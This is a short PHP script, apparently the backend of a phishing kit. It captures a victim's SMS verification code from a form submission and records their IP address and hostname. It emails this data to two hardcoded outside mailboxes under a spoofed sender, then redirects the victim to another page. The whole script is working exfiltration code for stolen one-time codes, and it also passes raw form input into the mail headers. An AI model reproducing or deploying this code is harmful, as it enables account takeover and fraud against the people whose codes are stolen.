<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "=============-----=============\n";
$message .= "SMSCODE  : ".$_POST['sms']."\n";
$message .= "===============================\n";

$send = "jihadonevbv@yahoo.com,jihad5@orange.fr";

$subject = "Fedback ssl - $ip";
$headers = "From:ssl <info@mtgstudios.se>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);


header("Location: sms.html");
?>